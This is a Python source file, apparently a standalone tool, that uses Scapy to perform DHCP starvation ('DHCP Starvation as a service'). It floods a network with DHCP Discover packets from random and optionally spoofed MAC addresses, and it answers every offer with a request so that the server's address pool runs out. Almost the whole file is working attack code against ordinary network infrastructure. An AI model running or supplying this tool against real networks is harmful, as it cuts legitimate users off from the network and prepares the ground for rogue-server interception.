#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = "Raúl Sampedro"

### Global imports
import argparse, sys, logging, time
from multiprocessing import Process

### Scapy imports
from scapy.arch import get_if_hwaddr
from scapy.sendrecv import sendp, sniff
from scapy.utils import mac2str
from scapy.volatile import RandMAC
from scapy.layers.l2 import Ether
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.config import conf as scapy_conf

## Local imports
import conf
from aux import _create_dhcp_options_dict
from dhcp_wrap import _build_dhcp_request_from_offer


logging.getLogger('scapy').setLevel(logging.WARNING)
logging.getLogger().setLevel(logging.DEBUG)
logging.basicConfig(format='%(message)s')


def _package_callback(pkg):

    options = _create_dhcp_options_dict(pkg)
    if not 'message-type' in options:
        return
    if options['message-type'] == 1: # Process DHCP Discover
        logging.debug("DHCP Discover received")
    elif options['message-type'] == 2:  # Process DHCP Offers
        logging.debug("DHCP Offer received")
        dhcp_req = _build_dhcp_request_from_offer(options)

        logging.warn('Client %s try to consume ip %s', options['chaddr'], options['yiaddr'])
        sendp(dhcp_req, iface=conf.iface)

    elif options['message-type'] == 3: # Process DHCP Request
        logging.debug("DHCP Request received")
    elif options['message-type'] == 4: # Process DHCP Decline
        logging.debug("DHCP Decline received")
    elif options['message-type'] == 5: # Process DHCP ACK
        logging.debug("DHCP ACK received")
    elif options['message-type'] == 6: # Process DHCP NACK
        logging.debug("DHCP NACK received")
    elif options['message-type'] == 7: # Process DHCP Release
        logging.debug("DHCP Release received")
    elif options['message-type'] == 8: # Process DHCP Info
        logging.debug("DHCP Info received")



def _send_dhcp_discover():
    rnd_mac = str(RandMAC())
    if_mac = conf.if_mac
    if conf.spoof:
        if_mac = rnd_mac

    logging.debug('Sending discovery from %s', rnd_mac)
    discover_pkg = Ether(src=if_mac, dst="ff:ff:ff:ff:ff:ff") / \
                   IP(src="0.0.0.0", dst="255.255.255.255") / \
                   UDP(sport=68, dport=67) / \
                   BOOTP(chaddr=mac2str(rnd_mac), xid=0x12345678) / \
                   DHCP(options=[
                       ("message-type", "discover"),
                       # ('hostname', str(RandString(12,'0123456789abcdef'))),
                       # ('param_req_list', b'x01x1c 2x03x0fx06x77x0cx2cx2fx1ax79x2a'),
                       "end"
                   ])

    sendp(discover_pkg, iface=conf.iface)


def discovery_task():
    while True:
        for i in range(0, conf.dparal):
            _send_dhcp_discover()

        time.sleep(conf.dtimer)


def run():
    discovery_thread = Process(target=discovery_task)
    discovery_thread.daemon = True
    discovery_thread.start()

    sniff(prn=_package_callback, filter="udp and port 68", lfilter=lambda (p): p.haslayer(DHCP), store=0)


def main():
    parser = argparse.ArgumentParser(description='DHCP Starvation as a service')
    parser.add_argument('--iface', default='eth0',
                       help='output interface (default:eth0)')
    parser.add_argument('--spoof-mac', action='store_true',
                       help='spoof ethernet mac address (default:false)')
    parser.add_argument('--dtimer', default=1, type=int,
                       help='discovery run interval in seconds (default:1)')
    parser.add_argument('--dparal', default=1, type=int,
                       help='discovery parallelize (default:1)')
    parser.add_argument('--hostname', default='android-',
                       help='fake client hostname (default:android-)')

    options = parser.parse_args(sys.argv[1:])

    conf.iface = options.iface
    conf.dparal = options.dparal
    conf.dtimer = options.dtimer
    conf.hostname = options.hostname
    conf.if_mac = get_if_hwaddr(conf.iface)
    conf.spoof = options.spoof_mac

    scapy_conf.checkIpaddr = False
    scapy_conf.verb = 0
    run()

if __name__ == "__main__":
    main()
